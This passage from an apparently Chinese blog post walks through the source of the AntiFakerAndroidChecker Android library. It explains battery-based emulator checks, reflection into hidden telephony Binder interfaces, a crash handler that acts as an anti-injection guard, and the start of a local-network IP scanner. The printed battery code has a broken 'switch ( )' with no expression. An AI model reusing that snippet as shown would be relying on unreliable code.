class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.snail.antifake.deviceid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.BatteryManager;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: hzlishang</span></span><br><span class="line"><span class="comment"> * Data: 17-8-18 下午1:54</span></span><br><span class="line"><span class="comment"> * Des:</span></span><br><span class="line"><span class="comment"> * version:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BatteryChangeReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> mIsCharging;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> mCurrentLevel;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只有未充电，并且电量经常不变才看成模拟器，这个方法很容易造假，参考意义不大</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">status</span> <span class="operator">=</span> intent.getIntExtra(BatteryManager.EXTRA_STATUS, <span class="number">0</span>);</span><br><span class="line">        mCurrentLevel = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> ( ) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> BatteryManager.BATTERY_STATUS_CHARGING:</span><br><span class="line">                <span class="comment">// 电池满不作为参考，看做充电中</span></span><br><span class="line">            <span class="keyword">case</span> BatteryManager.BATTERY_STATUS_FULL:</span><br><span class="line">            <span class="keyword">case</span> BatteryManager.BATTERY_STATUS_UNKNOWN:</span><br><span class="line">                mIsCharging = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> BatteryManager.BATTERY_STATUS_NOT_CHARGING:</span><br><span class="line">            <span class="keyword">case</span> BatteryManager.BATTERY_STATUS_DISCHARGING:</span><br><span class="line">                mIsCharging = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Toast.makeText(context, &quot; &quot; + mCurrentLevel + &quot; mIsCharging &quot;+ mIsCharging, Toast.LENGTH_SHORT).show();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCharging</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> mIsCharging;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCurrentLevel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> mCurrentLevel;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>public class BatteryChangeReceiver extends BroadcastReceiver</code>继承了<code>BroadcastReceiver</code>类，这意味着它具备了广播接收器的能力。</p><p><code>onReceive</code>方法的调用时机：要让 <code>onReceive</code> 方法被调用，需要两个步骤：</p><ol><li><strong>创建广播接收器</strong>：我们已经有了 <code>BatteryChangeReceiver</code> 这个类。</li><li><strong>注册广播接收器</strong>：我们需要告诉安卓系统，“嘿，我这里有一个接收器，它对某个特定的事件感兴趣。当这个事件发生时，请通知我。”</li></ol><p>这个“注册”的动作发生在 <code>AndroidDeviceIMEIUtil.java</code> 文件中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// d:\android_re\AntiFakerAndroidChecker-1.6.0\AntiFakerAndroidChecker-1.6.0\antifake\src\main\java\com\snail\antifake\deviceid\AndroidDeviceIMEIUtil.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerBatteryChangeListener</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sBatteryChangeReceiver == <span class="literal">null</span>) &#123;</span><br><span class="line">        sBatteryChangeReceiver = <span class="keyword">new</span> <span class="title class_">BatteryChangeReceiver</span>();</span><br><span class="line">        <span class="comment">// 1. 创建一个意图过滤器 (IntentFilter)</span></span><br><span class="line">        <span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 告诉过滤器，我们只对 &quot;ACTION_BATTERY_CHANGED&quot; 这个动作感兴趣</span></span><br><span class="line">        filter.addAction(Intent.ACTION_BATTERY_CHANGED);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. 使用上下文(context)将我们的接收器(sBatteryChangeReceiver)和过滤器(filter)注册到系统中</span></span><br><span class="line">        context.registerReceiver(sBatteryChangeReceiver, filter);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Intent.ACTION_BATTERY_CHANGED</code> 是安卓系统预定义的一个<strong>广播动作（Action）</strong></p><p>当系统检测到电池的状态发生了变化，比如：</p><ul><li>开始充电（插上充电器）</li><li>停止充电（拔掉充电器）</li><li>电量百分比发生改变（例如从 81% 掉到 80%）</li><li>电池充满</li><li>电池温度变化等</li></ul><p>系统就会发送一个带有 <code>ACTION_BATTERY_CHANGED</code> 动作的广播</p><p>由于我们的 <code>BatteryChangeReceiver</code> 已经注册监听了这个动作，所以安卓系统就会自动调用它的 <code>onReceive</code> 方法，并将包含详细信息的 <code>Intent</code> 对象传递进来</p><p><code>status</code>也可以通过定义看到，其值是通过<code>intent</code>监听<code>Broadcast</code>获取的</p><p>或者说是<code>BroadcastReceiver</code>带给<code>intent</code>的值</p><p>不过也可知这是关于当前电池状态的变化的状态的</p><blockquote><p><code>BatteryManager.BATTERY_STATUS_CHARGING</code>：设备正在充电。</p><p><code>BatteryManager.BATTERY_STATUS_DISCHARGING</code>：设备正在使用电池。</p><p><code>BatteryManager.BATTERY_STATUS_NOT_CHARGING</code>：设备未在充电。</p><p><code>BatteryManager.BATTERY_STATUS_FULL</code>：电池已充满。</p><p><code>BatteryManager.BATTERY_STATUS_UNKNOWN</code>：电池状态未知。</p></blockquote><p>如果设备正在充电、电池已充满或者电池状态未知，<code>mIsCharging</code> 标志被设置为 <code>true</code>。</p><p>如果状态是 <code>BATTERY_STATUS_NOT_CHARGING</code> 或 <code>BATTERY_STATUS_DISCHARGING</code>，<code>mIsCharging</code> 标志被设置为 <code>false</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCharging</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mIsCharging;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCurrentLevel</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mCurrentLevel;<span class="comment">//电池电量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BinderUtil-java"><a href="#BinderUtil-java" class="headerlink" title="BinderUtil.java"></a>BinderUtil.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.snail.antifake.deviceid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: hzlishang</span></span><br><span class="line"><span class="comment"> * Data: 17-7-13 下午1:29</span></span><br><span class="line"><span class="comment"> * Des:</span></span><br><span class="line"><span class="comment"> * version:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinderUtil</span> &#123;</span><br><span class="line">    <span class="comment">//根据方法名，反射获得方法transactionId</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getTransactionId</span><span class="params">(Object proxy,</span></span><br><span class="line"><span class="params">                                        String name)</span> <span class="keyword">throws</span> RemoteException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">transactionId</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">outclass</span> <span class="operator">=</span> proxy.getClass().getEnclosingClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">idField</span> <span class="operator">=</span> outclass.getDeclaredField(name);</span><br><span class="line">        idField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transactionId = (<span class="type">int</span>) idField.get(proxy);</span><br><span class="line">        <span class="keyword">return</span> transactionId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//根据方法名，反射获得方法transactionId</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getInterfaceDescriptor</span><span class="params">(Object proxy)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getInterfaceDescriptor</span> <span class="operator">=</span> proxy.getClass().getDeclaredMethod(<span class="string">&quot;getInterfaceDescriptor&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (String) getInterfaceDescriptor.invoke(proxy);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码是一个名为 <code>BinderUtil</code> 的工具类，这个工具类的核心目的是通过 <strong>Java 反射</strong> 技术，来获取 Android 系统底层 <strong>Binder 通信机制</strong> 中的一些关键信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据方法名，反射获得方法transactionId</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getTransactionId</span><span class="params">(Object proxy,</span></span><br><span class="line"><span class="params">                                    String name)</span> <span class="keyword">throws</span> RemoteException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">transactionId</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 1. 获取代理对象所属的外部类（通常是 Stub 类）</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">outclass</span> <span class="operator">=</span> proxy.getClass().getEnclosingClass();</span><br><span class="line">    <span class="comment">// 2. 在外部类中查找名为 name 的字段</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">idField</span> <span class="operator">=</span> outclass.getDeclaredField(name);</span><br><span class="line">    <span class="comment">// 3. 强制使其可访问（即使是 private）</span></span><br><span class="line">    idField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 4. 获取该字段的值</span></span><br><span class="line">    transactionId = (<span class="type">int</span>) idField.get(proxy);</span><br><span class="line">    <span class="keyword">return</span> transactionId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Binder 通信中，每个可以被远程调用的方法都有一个唯一的整数 ID，称为 <code>Transaction ID</code>。当客户端发起调用时，并不会把方法名传给服务端，而是传递这个 <code>Transaction ID</code>。服务端根据这个 ID 来判断应该执行哪个具体的方法。 这些 ID 通常在编译时由 AIDL（Android 接口定义语言）工具自动生成，并作为 <code>static final int</code> 常量字段定义在 <code>Stub</code> 类中，例如 <code>TRANSACTION_getDeviceId</code>。</p><p>这个方法的作用就是通过反射，在运行时动态地获取这个 <code>Transaction ID</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据方法名，反射获得方法transactionId</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getInterfaceDescriptor</span><span class="params">(Object proxy)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">    <span class="comment">// 1. 获取 proxy 类中名为 &quot;getInterfaceDescriptor&quot; 的方法</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">getInterfaceDescriptor</span> <span class="operator">=</span> proxy.getClass().getDeclaredMethod(<span class="string">&quot;getInterfaceDescriptor&quot;</span>);</span><br><span class="line">    <span class="comment">// 2. 调用该方法</span></span><br><span class="line">    <span class="keyword">return</span> (String) getInterfaceDescriptor.invoke(proxy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个 Binder 服务都有一个唯一的字符串名称，称为“接口描述符”（Interface Descriptor）。它通常是接口的完整类名（例如 <code>&quot;android.telephony.ITelephony&quot;</code>）。这个描述符用于在 Binder 通信的两端验证对方是不是自己想要通信的那个服务。 <code>IBinder</code> 接口本身就定义了 <code>getInterfaceDescriptor()</code> 方法，所有 Binder 对象都实现了它</p><p>这个工具方法的作用就是通过反射来调用 <code>getInterfaceDescriptor()</code> 方法</p><p>但是这里有个问题就是，这个项目本身在使用这个方法是通过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">Stub</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.android.internal.telephony.IPhoneSubInfo$Stub&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">asInterface</span> <span class="operator">=</span> Stub.getDeclaredMethod(<span class="string">&quot;asInterface&quot;</span>, IBinder.class);</span><br><span class="line">asInterface.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">binderProxy</span> <span class="operator">=</span> asInterface.invoke(<span class="literal">null</span>, binder);</span><br><span class="line">BinderUtil.getTransactionId(binderProxy, <span class="string">&quot;TRANSACTION_getDeviceId&quot;</span>);</span><br></pre></td></tr></table></figure><p>这样调用的，而如此调用会发生一个错误：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.NoSuchMethodException: com.android.internal.telephony.IPhoneSubInfo$Stub$Proxy.getInterfaceDescriptor []</span><br></pre></td></tr></table></figure><p>原因是：对于这个Proxy来说，不存在<code>getInterfaceDescriptor</code>这个方法，<code>getInterfaceDescriptor</code>是在<code>IBinder</code>底层类就有实现的，而这个通过<code>asInterface</code>返回的Proxy代理类是由系统在编译时根据提供的AIDL文件生成的，它只包含AIDL中的业务方法而不会包含像<code>getInterfaceDescriptor</code>这种<code>IBinder</code>底层管理方法</p><p>因此要先获取其<code>IBinder</code>然后调用对应的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getInterfaceDescriptor</span><span class="params">(Object proxy)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, RemoteException &#123;</span><br><span class="line">    <span class="keyword">if</span> (proxy <span class="keyword">instanceof</span> IInterface) &#123;</span><br><span class="line">        <span class="keyword">return</span> ((IInterface) proxy).asBinder().getInterfaceDescriptor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Fallback for other types of proxies if needed, though less likely for AIDL.</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">getInterfaceDescriptorMethod</span> <span class="operator">=</span> proxy.getClass().getMethod(<span class="string">&quot;getInterfaceDescriptor&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> (String) getInterfaceDescriptorMethod.invoke(proxy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CrashHandler-java"><a href="#CrashHandler-java" class="headerlink" title="CrashHandler.java"></a>CrashHandler.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.snail.antifake.deviceid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.ActivityManager;</span><br><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Process;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: snail</span></span><br><span class="line"><span class="comment"> * Data: 2017/8/3 下午3:25</span></span><br><span class="line"><span class="comment"> * Des:</span></span><br><span class="line"><span class="comment"> * version:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CrashHandler</span> <span class="keyword">implements</span> <span class="title class_">Thread</span>.UncaughtExceptionHandler &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Application mApplication;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CrashHandler</span><span class="params">(Application application)</span>&#123;</span><br><span class="line">        mApplication=application;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">uncaughtException</span><span class="params">(Thread thread, Throwable ex)</span> &#123;</span><br><span class="line">        Process.killProcess( Process.myPid());</span><br><span class="line">        <span class="type">ActivityManager</span> <span class="variable">manager</span> <span class="operator">=</span> (ActivityManager)</span><br><span class="line">                mApplication.getSystemService(Context.ACTIVITY_SERVICE);</span><br><span class="line">        <span class="keyword">for</span> (ActivityManager.RunningAppProcessInfo processInfo : manager.getRunningAppProcesses()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (processInfo.pid == Process.myPid()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!mApplication.getPackageName().equals(processInfo.processName)) &#123;</span><br><span class="line">                    Process.killProcess( Process.myPid());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>implements</code>的作用是**声明一个类正在“实现”一个或多个接口 (Interface)**，可以一次声明多个接口</p><p><strong>如果是一个普通类 (Concrete Class)：</strong>必须<strong>实现该接口及其所有父接口中定义的</strong>所有抽象 (abstract) 方法。如果漏掉了任何一个，Java 编译器都会报错。</p><p><strong>如果是一个抽象类 (Abstract Class)：</strong> <strong>不需要</strong>实现所有方法。你可以选择实现一部分、或一个都不实现。</p></blockquote><blockquote><p><code>Thread.UncaughtExceptionHandler</code> 是 Java 提供的一个接口。任何实现了这个接口的类都可以被注册为“默认的未捕获异常处理器”。当应用中的任何线程（包括主线程）抛出一个没有被 <code>try-catch</code> 语句捕获的异常时，JVM 就会自动调用这个处理器中的 <code>uncaughtException</code> 方法。</p></blockquote><p>这个 <code>CrashHandler</code> 的设计目的并不仅仅是为了处理常规的程序崩溃，它还包含了一层<strong>基础的反注入和反调试保护</strong>。</p><ul><li><strong>常规崩溃处理</strong>：在任何未捕获异常发生时，它会确保应用进程被彻底终止，而不是依赖系统默认的崩溃对话框。</li><li><strong>安全检测</strong>：它在应用崩溃的瞬间，检查自身进程名是否与预期的包名一致。如果发现不一致，它会再次强制杀死进程。这可以防止在某些被注入或篡改的环境下，即使应用主逻辑崩溃，注入的代码仍然可能继续在应用的进程空间中运行。</li></ul><h3 id="IpScanner-java"><a href="#IpScanner-java" class="headerlink" title="IpScanner.java"></a>IpScanner.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">getHostIP</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">hostIp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Enumeration</span> <span class="variable">nis</span> <span class="operator">=</span> NetworkInterface.getNetworkInterfaces();</span><br><span class="line">        InetAddress ia;</span><br><span class="line">        <span class="keyword">while</span> (nis.hasMoreElements()) &#123;</span><br><span class="line">            <span class="type">NetworkInterface</span> <span class="variable">ni</span> <span class="operator">=</span> (NetworkInterface) nis.nextElement();</span><br><span class="line">            Enumeration&lt;InetAddress&gt; ias = ni.getInetAddresses();</span><br><span class="line">            <span class="keyword">while</span> (ias.hasMoreElements()) &#123;</span><br><span class="line">                ia = ias.nextElement();</span><br><span class="line">                <span class="keyword">if</span> (ia <span class="keyword">instanceof</span> Inet6Address) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;<span class="comment">// skip ipv6</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> ia.getHostAddress();</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;127.0.0.1&quot;</span>.equals(ip)) &#123;</span><br><span class="line">                    hostIp = ia.getHostAddress();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SocketException e) &#123;</span><br><span class="line">        Log.i(<span class="string">&quot;kalshen&quot;</span>, <span class="string">&quot;SocketException&quot;</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hostIp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>Enumeration nis = NetworkInterface.getNetworkInterfaces();</code></strong></p><ul><li>这是获取网络信息的关键入口。<code>NetworkInterface</code> 类代表一个网络接口，如Wi-Fi网卡 (<code>wlan0</code>)、移动数据网络接口或以太网卡 (<code>eth0</code>)。</li><li><code>getNetworkInterfaces()</code> 方法返回一个 <code>Enumeration</code> (枚举) 对象，其中包含了设备上所有可用的网络接口。</li></ul><p><code>Enumeration&lt;InetAddress&gt; ias = ni.getInetAddresses();</code></p><p>对于每一个网络接口，调用 <code>getInetAddresses()</code> 方法。一个网络接口可能绑定了多个IP地址（例如，一个<code>IPv4</code>地址和一个或多个<code>IPv6</code>地址）。此方法返回包含所有这些地址的 <code>Enumeration</code> 对象</p><p>一旦找到了一个既不是IPv6也不是本地回环地址的IP，就将其赋值给 <code>hostIp</code> 变量，然后停止循环</p><p>但是这里的代码并不能确保获取的IPv4就是本机<code>ip</code>地址</p><p>可以进行改进：</p><ul><li><code>intf.getName().equalsIgnoreCase(&quot;wlan0&quot;)</code>: 明确指定查找名为 “wlan0” 的接口，这是绝大多数Android设备上Wi-Fi接口的名称。</li><li><code>intf.isUp()</code>: 确保这个网络接口是“活跃”的。</li><li><code>!inetAddress.isLoopbackAddress()</code>: 这是比 <code>!&quot;127.0.0.1&quot;.equals(ip)</code> 更规范的判断回环地址的方法。</li><li><code>inetAddress instanceof java.net.Inet4Address</code>: 这是比 <code>!(ia instanceof Inet6Address)</code> 更直接的判断IPv4的方式。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startScan</span><span class="params">(<span class="keyword">final</span> OnScanListener listener)</span> &#123;</span><br><span class="line">    <span class="comment">//局域网内存在的ip集合</span></span><br><span class="line">    <span class="keyword">final</span> List&lt;String&gt; ipList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">final</span> Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取本机所在的局域网地址</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">hostIP</span> <span class="operator">=</span> getHostIP();</span><br><span class="line">    <span class="keyword">if</span>(TextUtils.isEmpty(hostIP))</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    <span class="type">int</span> <span class="variable">lastIndexOf</span> <span class="operator">=</span> hostIP.lastIndexOf(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">substring</span> <span class="operator">=</span> hostIP.substring(<span class="number">0</span>, lastIndexOf + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">DatagramPacket</span> <span class="variable">dp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 